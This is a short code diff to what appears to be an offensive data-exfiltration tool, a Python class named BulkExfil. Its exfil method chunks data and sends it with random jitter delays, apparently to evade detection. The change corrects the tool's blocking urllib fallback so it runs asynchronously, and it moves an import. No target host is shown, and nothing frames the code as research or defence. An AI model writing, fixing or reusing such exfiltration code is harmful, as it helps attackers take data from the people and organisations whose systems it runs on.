@@ -1,4 +1,4 @@
-import asyncio, random
+import asyncio, random, time
 
 try:
     import aiohttp
@@ -14,7 +14,8 @@ class BulkExfil:
 
     async def exfil(self, data: str, chunk_size: int = 1048576, jitter: tuple = (0.1, 0.3)) -> dict:
         if not HAS_AIOHTTP:
-            return self._urllib_exfil(data, chunk_size, jitter)
+            loop = asyncio.get_running_loop()
+            return await loop.run_in_executor(None, self._urllib_exfil, data, chunk_size, jitter)
         raw = data.encode()
         chunks = [raw[i:i+chunk_size] for i in range(0, len(raw), chunk_size)]
         results = []
@@ -76,6 +77,3 @@ class BulkExfil:
             "failed": sum(1 for r in results if not r["sent"]),
             "results": results,
         }
-
-
-import time
